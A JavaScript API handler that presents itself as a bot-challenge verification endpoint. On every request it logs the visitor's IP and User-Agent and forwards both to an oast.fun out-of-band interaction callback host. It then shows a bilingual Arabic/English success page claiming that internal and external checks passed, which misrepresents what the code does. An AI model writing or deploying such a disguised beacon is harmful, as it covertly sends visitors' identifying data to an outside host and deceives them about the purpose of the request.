export default async function handler(req, res) {
  console.log("Verification hit");
  console.log("User-Agent:", req.headers["user-agent"]);
  console.log("IP:", req.headers["x-forwarded-for"] || req.connection.remoteAddress);
  console.log("Timestamp:", new Date().toISOString());
  
  try {
    // إرسال طلب إلى الموقع المطلوب
    console.log("Sending request to external endpoint...");
    const response = await fetch("http://errllsoycjdlrzadatzfervyqp5oq1o0d.oast.fun/check", {
      method: "GET",
      headers: {
        "User-Agent": req.headers["user-agent"] || "Bot-Challenge-Verifier/1.0",
        "X-Forwarded-For": req.headers["x-forwarded-for"] || "unknown",
        "X-Verification-Source": "bot-challenge-system"
      }
    });
    
    console.log("External request status:", response.status);
    console.log("External request completed");
    
    // إرسال استجابة محسنة
    res.status(200).send(`
      <!DOCTYPE html>
      <html lang="ar" dir="rtl">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>تم التحقق - Verification Complete</title>
        <link rel="icon" type="image/svg+xml" href="/api/favicon.ico">
        <link rel="alternate icon" href="/api/favicon.ico">
        <style>
          * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
          }
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #00b894 0%, #00cec9 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #333;
          }
          .container {
            background: white;
            padding: 2.5rem;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 500px;
            width: 90%;
            text-align: center;
            animation: successPulse 0.6s ease-out;
          }
          @keyframes successPulse {
            0% { transform: scale(0.8); opacity: 0; }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); opacity: 1; }
          }
          .success-icon {
            font-size: 4rem;
            margin-bottom: 1rem;
            color: #00b894;
            animation: checkmark 0.8s ease-in-out;
          }
          @keyframes checkmark {
            0% { transform: scale(0); }
            50% { transform: scale(1.2); }
            100% { transform: scale(1); }
          }
          h1 {
            color: #2c3e50;
            margin-bottom: 1rem;
            font-size: 1.8rem;
          }
          .success-message {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            color: #155724;
          }
          .info-box {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            text-align: right;
          }
          .status-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 0.5rem 0;
            padding: 0.5rem;
            background: white;
            border-radius: 5px;
            border-right: 3px solid #00b894;
          }
          .status-check {
            color: #00b894;
            font-weight: bold;
          }
          .footer {
            margin-top: 1.5rem;
            font-size: 0.9rem;
            color: #7f8c8d;
          }
          .return-link {
            display: inline-block;
            margin-top: 1rem;
            padding: 0.8rem 1.5rem;
            background: #00b894;
            color: white;
            text-decoration: none;
            border-radius: 25px;
            transition: background 0.3s ease;
          }
          .return-link:hover {
            background: #00a085;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="success-icon">✅</div>
          <h1>تم التحقق بنجاح - Verification Complete</h1>
          
          <div class="success-message">
            <strong>تم تسجيل التحقق بنجاح!</strong><br>
            Verification has been successfully recorded!
          </div>
          
          <div class="info-box">
            <div class="status-item">
              <span>التحقق الداخلي</span>
              <span class="status-check">✓ مكتمل</span>
            </div>
            <div class="status-item">
              <span>التحقق الخارجي</span>
              <span class="status-check">✓ مكتمل</span>
            </div>
            <div class="status-item">
              <span>تسجيل البيانات</span>
              <span class="status-check">✓ مكتمل</span>
            </div>
          </div>
          
          <div class="footer">
            يمكنك الآن العودة إلى الصفحة الرئيسية
            <br>You may now return to the main page
          </div>
          
          <a href="/" class="return-link">العودة للصفحة الرئيسية</a>
        </div>
      </body>
      </html>
    `);
    
  } catch (error) {
    console.error("Error sending external request:", error);
    
    // في حالة فشل الطلب الخارجي، نرسل استجابة بالخطأ
    res.status(200).send(`
      <!DOCTYPE html>
      <html lang="ar" dir="rtl">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>خطأ في التحقق - Verification Error</title>
        <link rel="icon" type="image/svg+xml" href="/api/favicon.ico">
        <link rel="alternate icon" href="/api/favicon.ico">
        <style>
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #e17055 0%, #d63031 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #333;
          }
          .container {
            background: white;
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 500px;
            width: 90%;
            text-align: center;
          }
          .error-icon {
            font-size: 4rem;
            margin-bottom: 1rem;
            color: #e17055;
          }
          .error-message {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            color: #721c24;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="error-icon">⚠️</div>
          <h1>خطأ في التحقق - Verification Error</h1>
          <div class="error-message">
            فشل في إرسال طلب التحقق الخارجي<br>
            Failed to send external verification request<br>
            <small>Error: ${error.message}</small>
          </div>
          <p>تم تسجيل التحقق الداخلي، لكن فشل التحقق الخارجي</p>
        </div>
      </body>
      </html>
    `);
  }
}